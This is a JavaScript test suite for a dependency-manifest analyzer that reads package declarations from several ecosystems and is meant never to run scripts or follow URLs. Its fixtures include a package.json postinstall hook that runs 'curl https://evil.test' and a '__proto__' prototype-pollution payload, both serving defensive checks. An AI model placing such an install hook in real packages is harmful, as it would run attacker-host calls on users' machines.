import { describe, it, expect, vi } from "vitest";
import {
  analyzeManifest,
  manifests,
} from "../src/stack-intelligence/manifests.js";
import { StackClient, scanStacks } from "../src/stack-intelligence/client.js";
import { AuditClient } from "../src/repository-audit/github.js";
const repo = { full_name: "example/project", default_branch: "main" };
const file = (path, source) => ({
  type: "file",
  path,
  size: Buffer.byteLength(source),
  encoding: "base64",
  content: Buffer.from(source).toString("base64"),
  sha: "a".repeat(40),
});
const names = (result) => result.entries.map((e) => e.name);

describe("manifest declarations, never developer skills", () => {
  it("reads Node roles and aliases without interpreting scripts, descriptions or metadata", () => {
    const result = analyzeManifest(
      "package.json",
      JSON.stringify({
        scripts: { postinstall: "globalThis.manifestExecuted=true" },
        description: "react rust python",
        dependencies: { react: "^19", alias: "npm:@scope/real@1" },
        devDependencies: { vitest: "*" },
        peerDependencies: { vue: "*" },
        optionalDependencies: { sharp: "*" },
        workspaces: ["packages/*"],
      }),
    );
    expect(names(result)).toEqual([
      "react",
      "@scope/real",
      "vitest",
      "vue",
      "sharp",
    ]);
    expect(result.entries.map((e) => e.role)).toEqual([
      "runtime",
      "runtime",
      "development",
      "peer",
      "optional",
    ]);
    expect(globalThis.manifestExecuted).toBeUndefined();
    expect(result.notes.join(" ")).toContain("not followed");
  });
  it("reads Cargo aliases, inline/nested tables, target declarations and workspace references", () => {
    const result = analyzeManifest(
      "Cargo.toml",
      `
[package]
name = "not-a-dependency"
description = """
[dependencies]
fake = "1"
"""
[dependencies]
serde = { version = "1", features = ["derive"] } # comment
alias = { package = "actual", version = "1" }
shared = { workspace = true }
[dependencies.tokio]
version = "1"
features = ["full"]
[dev-dependencies]
insta = "1"
[build-dependencies]
cc = "1"
[target.'cfg(target_os = "linux")'.dependencies]
libc = "0.2"
[workspace.dependencies]
tracing = "0.1"
`,
    );
    expect(names(result)).toEqual([
      "serde",
      "actual",
      "tokio",
      "insta",
      "cc",
      "libc",
    ]);
    expect(result.notes.join(" ")).toContain("Unresolved workspace");
    expect(result.entries[0].line).toBeGreaterThan(5);
  });
  it("reads Python declarative arrays, extras, build dependencies, groups and Poetry", () => {
    const result = analyzeManifest(
      "pyproject.toml",
      `
[project]
dependencies = [
 "Requests>=2; python_version > '3.9'",
 'rich[all]>=1',
]
dynamic = ["optional-dependencies"]
[project.optional-dependencies]
test = ["pytest"]
[build-system]
requires = ["setuptools>=70"]
[dependency-groups]
dev = ["ruff", {include-group = "test"}]
[tool.poetry.dependencies]
python = "^3.12"
pydantic = "^2"
[tool.poetry.group.test.dependencies]
pytest-cov = "*"
`,
    );
    expect(names(result)).toEqual([
      "requests",
      "rich",
      "pytest",
      "setuptools",
      "ruff",
      "pydantic",
      "pytest-cov",
    ]);
    expect(result.notes.join(" ")).toContain("intentionally not resolved");
  });
  it("does not follow requirements includes, URLs or executable config", () => {
    const result = analyzeManifest(
      "requirements.txt",
      "# ignored\nrequests==2\n-r private.txt\n--index-url https://example.org\nSome_Pkg[extra] @ https://example.org/pkg.whl\nprint('hello')",
    );
    expect(names(result)).toEqual(["requests", "some-pkg"]);
    expect(result.notes.length).toBeGreaterThan(0);
  });
  it("reads direct/indirect Go requirements without mistaking replacements or own module for dependencies", () => {
    const result = analyzeManifest(
      "go.mod",
      `module example.org/self
go 1.25
require example.org/one v1.2.3
require (
 example.org/two v2.0.0 // indirect
)
replace (
 example.org/one => ../local
)
exclude example.org/no v1.0.0
// require example.org/fake v1.0.0
`,
    );
    expect(names(result)).toEqual(["example.org/one"]);
    expect(result.entries[0].role).toBe("runtime");
    expect(result.notes.join(" ")).toContain(
      "Indirect Go requirements were excluded",
    );
    expect(result.notes.join(" ")).toContain("not resolved");
  });
  it.each([
    ["package.json", "{"],
    ["Cargo.toml", '[dependencies]\na=["unterminated'],
    ["pyproject.toml", '[project]\ndependencies="not an array"'],
    ["go.mod", "require (\n bad"],
  ])("rejects unreadable %s declarations", (path, source) => {
    expect(() => analyzeManifest(path, source)).toThrow();
  });
  it("bounds input and output, rejects unsupported paths and does not pollute prototypes", () => {
    expect(() => analyzeManifest("setup.py", "print('no')")).toThrow();
    expect(() => analyzeManifest("package.json", " ".repeat(256001))).toThrow();
    const deps = Object.fromEntries(
      Array.from({ length: 250 }, (_, i) => ["pkg" + i, "1"]),
    );
    expect(
      analyzeManifest("package.json", JSON.stringify({ dependencies: deps }))
        .entries,
    ).toHaveLength(200);
    analyzeManifest(
      "Cargo.toml",
      "[dependencies.test]\n__proto__ = { polluted = true }\nversion = '1'",
    );
    expect({}.polluted).toBeUndefined();
    expect(manifests).toHaveLength(5);
  });
});

describe("opt-in manifest request framework", () => {
  it("requests only allowlisted regular root files, caches normalized evidence and never follows URLs", async () => {
    const calls = [];
    const client = {
      request: async (path) => {
        calls.push(path);
        if (path.includes("package.json"))
          return {
            data: file(
              "package.json",
              '{"dependencies":{"react":"1"},"scripts":{"postinstall":"curl https://evil.test"}}',
            ),
          };
        return {
          data: [
            { type: "file", path: "package.json", size: 70 },
            { type: "file", path: "setup.py" },
            { type: "dir", path: "packages" },
            { type: "symlink", path: "Cargo.toml" },
          ],
        };
      },
    };
    const stack = new StackClient({ client });
    const result = await stack.repository(repo);
    expect(result.status).toBe("partial");
    expect(result.manifests[0].entries[0].name).toBe("react");
    expect(calls).toEqual([
      "/repos/example/project/contents/?ref=main",
      "/repos/example/project/contents/package.json?ref=main",
    ]);
    expect(result.issues.join(" ")).toContain("Cargo.toml");
    expect(JSON.stringify(result)).not.toContain("postinstall");
  });
  it("caches successful scans for five minutes and supports explicit refresh", async () => {
    let now = 0;
    const request = vi.fn(async () => ({ data: [] }));
    const stack = new StackClient({ client: { request }, now: () => now });
    expect((await stack.repository(repo)).status).toBe("none");
    await stack.repository(repo);
    expect(request).toHaveBeenCalledTimes(1);
    await stack.repository(repo, { force: true });
    expect(request).toHaveBeenCalledTimes(2);
    now = 300001;
    await stack.repository(repo);
    expect(request).toHaveBeenCalledTimes(3);
    stack.clear();
    expect(stack.bytes).toBe(0);
  });
  it("retains successful manifests alongside malformed or mismatched content", async () => {
    const client = {
      request: async (path) => {
        if (path.includes("package.json"))
          return {
            data: file("package.json", '{"dependencies":{"react":"1"}}'),
          };
        if (path.includes("Cargo.toml"))
          return { data: file("other.toml", "") };
        return {
          data: [
            { path: "package.json", type: "file" },
            { path: "Cargo.toml", type: "file" },
          ],
        };
      },
    };
    const result = await new StackClient({ client }).repository(repo);
    expect(result.status).toBe("partial");
    expect(result.manifests).toHaveLength(1);
    expect(result.issues).toHaveLength(1);
  });
  it("preserves missing/failure distinction and stops on rate limits", async () => {
    const fetcher = vi.fn(
      async () =>
        new Response("{}", { status: 429, headers: { "retry-after": "60" } }),
    );
    const records = [];
    const result = await scanStacks(
      Array.from({ length: 100 }, (_, i) => ({ full_name: "example/r" + i })),
      {
        client: new StackClient({ client: new AuditClient({ fetcher }) }),
        onResult: (r) => records.push(r),
      },
    );
    expect(result.stopped).toBeTruthy();
    expect(fetcher.mock.calls.length).toBeLessThanOrEqual(3);
    expect(records.every((r) => r.status === "failed")).toBe(true);
    expect(result.remaining).toBeGreaterThan(90);
  });
  it.each([100, 500, 1000])(
    "bounds concurrency and deterministic result identity for %i repositories",
    async (count) => {
      let active = 0,
        max = 0;
      const records = [];
      const client = {
        repository: async (r) => {
          active++;
          max = Math.max(max, active);
          await Promise.resolve();
          active--;
          return {
            repository: r.full_name,
            status: "none",
            manifests: [],
            issues: [],
          };
        },
      };
      const result = await scanStacks(
        Array.from({ length: count }, (_, i) => ({
          full_name: "example/r" + i,
        })),
        { client, onResult: (r) => records.push(r) },
      );
      expect(max).toBeLessThanOrEqual(3);
      expect(result.completed).toBe(count);
      expect(new Set(records.map((r) => r.repository)).size).toBe(count);
    },
  );
  it("cancellation schedules no new repositories and publishes no late result", async () => {
    const controller = new AbortController(),
      onResult = vi.fn();
    const client = {
      repository: vi.fn(async () => {
        controller.abort();
        return {};
      }),
    };
    const result = await scanStacks([repo, repo], {
      client,
      signal: controller.signal,
      onResult,
    });
    expect(result.cancelled).toBe(true);
    expect(onResult).not.toHaveBeenCalled();
  });
});

it("does not turn arbitrary requirements prose or code into package evidence", () => {
  expect(
    names(
      analyzeManifest(
        "requirements.txt",
        "pip install requests\nthis is a comment without a hash\nprint('hello')\nrequests (>=2)\nrich # useful",
      ),
    ),
  ).toEqual(["requests", "rich"]);
});
it("accepts Go whitespace and caps pathological TOML keys", () => {
  expect(
    names(analyzeManifest("go.mod", "require\texample.org/module v1.0.0")),
  ).toEqual(["example.org/module"]);
  expect(() =>
    analyzeManifest(
      "Cargo.toml",
      '[target."' + "x".repeat(1001) + '".dependencies]\nserde="1"',
    ),
  ).toThrow("limit");
});
it("does not revive old cache evidence after a failed forced refresh", async () => {
  let fail = false;
  const request = vi.fn(async () => {
    if (fail) throw Error("offline");
    return { data: [] };
  });
  const client = new StackClient({ client: { request } });
  await client.repository(repo);
  fail = true;
  await expect(client.repository(repo, { force: true })).rejects.toThrow(
    "offline",
  );
  await expect(client.repository(repo)).rejects.toThrow("offline");
  expect(request).toHaveBeenCalledTimes(3);
  expect(client.bytes).toBe(0);
});
it("rejects oversize, non-UTF8 and symlink responses without parsing", async () => {
  for (const bad of [
    { ...file("package.json", "{}"), size: 256001 },
    {
      ...file("package.json", "{}"),
      size: 1,
      content: Buffer.from([255]).toString("base64"),
    },
    { ...file("package.json", "{}"), type: "symlink", target: "setup.py" },
  ]) {
    const request = async (path) => ({
      data: path.includes("package.json")
        ? bad
        : [{ type: "file", path: "package.json" }],
    });
    const result = await new StackClient({ client: { request } }).repository(
      repo,
    );
    expect(result.status).toBe("partial");
    expect(result.manifests).toHaveLength(0);
  }
});
it("evicts normalized cache entries and bounds combined repository evidence", async () => {
  const many = Object.fromEntries(
    Array.from({ length: 200 }, (_, i) => ["pkg" + i, "1"]),
  );
  const request = async (path) => {
    if (path.includes("package.json"))
      return {
        data: file("package.json", JSON.stringify({ dependencies: many })),
      };
    if (path.includes("requirements.txt"))
      return { data: file("requirements.txt", "requests") };
    return {
      data: [
        { path: "package.json", type: "file" },
        { path: "requirements.txt", type: "file" },
      ],
    };
  };
  const result = await new StackClient({ client: { request } }).repository(
    repo,
  );
  expect(result.manifests.reduce((n, m) => n + m.entries.length, 0)).toBe(200);
  expect(result.status).toBe("partial");
  const client = new StackClient({
    client: { request: async () => ({ data: [] }) },
  });
  for (let i = 0; i < 140; i++)
    await client.repository({ full_name: "example/r" + i });
  expect(client.cache.size).toBe(128);
  expect(client.bytes).toBeLessThanOrEqual(2_000_000);
});
